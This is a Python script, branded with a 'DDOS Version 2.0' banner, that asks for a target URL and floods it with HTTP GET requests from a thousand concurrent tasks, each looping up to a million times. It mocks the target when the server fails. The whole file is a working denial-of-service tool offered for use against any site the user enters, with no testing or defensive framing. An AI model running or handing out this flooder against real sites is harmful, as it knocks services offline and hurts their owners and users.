import aiohttp
import asyncio
import time
import os
import importlib

os.system('cls' if os.name == 'nt' else 'clear')

print("""
\033[31m▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                          
                            Version 2.0

""")



total_requests = 1000000
requests_per_second = 1000

async def attack(target_url):
    try:
        async with aiohttp.ClientSession() as session:
            for _ in range(total_requests):
                async with session.get(target_url) as response:
                    print(f"Status Code: {response.status}")
                    if response.status != 200:
                        print("GYA TATA BYE BYE 🤣🤣")
                await asyncio.sleep(1 / requests_per_second)
    except aiohttp.ClientError as e:
        print(f"Client error: {e}")
    except asyncio.TimeoutError:
        print("Request timed out")
    except Exception as e:
        print(f"Unexpected error: {e}")

async def main(target_url):
    await asyncio.gather(*[attack(target_url) for _ in range(requests_per_second)])

if __name__ == "__main__":
        target_url = input("Enter the URL to attack: ")
        asyncio.run(main(target_url))

